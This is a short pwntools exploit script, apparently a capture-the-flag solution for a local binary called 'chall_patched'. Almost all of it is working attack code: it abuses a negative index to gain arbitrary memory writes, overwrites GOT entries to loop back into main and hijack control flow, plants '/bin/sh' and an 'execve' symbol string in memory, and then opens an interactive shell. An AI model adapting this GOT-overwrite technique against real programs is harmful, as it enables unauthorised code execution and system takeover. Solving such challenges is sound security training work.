from pwn import *

exe = './chall_patched'


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

context.log_level='DEBUG'

p = start()

# overwriting puts to get infinite writes
def write(pos : int,what : int):    
    p.recvuntil(b"n = ")
    p.sendline(b"-10")
    p.recvuntil("i = ")
    p.sendline(str((pos//0x4)).encode())
    p.recvuntil("= ")
    p.sendline(str(what).encode())
    return

def done():
    p.recvuntil(b"n = ")
    p.sendline(str(0x601080).encode()) # To send address of /bin/sh
    
write(0x601018,0x400737)  # getting infinite writes (puts to main)

write(0x601080,int(enhex(b"nib/"),16))
write(0x601080+0x4,int(enhex(b"\x00hs/"),16))
write(0x3ff4cd,int(enhex(b"exe\x00"),16))
write(0x3ff4cd+0x4,int(enhex(b"evc"),16))

write(0x601020,0x4005f6) # replacing got of setbuf with to be plt[1] of setbuf
write(0x601024,0x0)
write(0x601048,0x40083c) # replacing puts to setup function to setup argument rdi

done()

p.interactive()

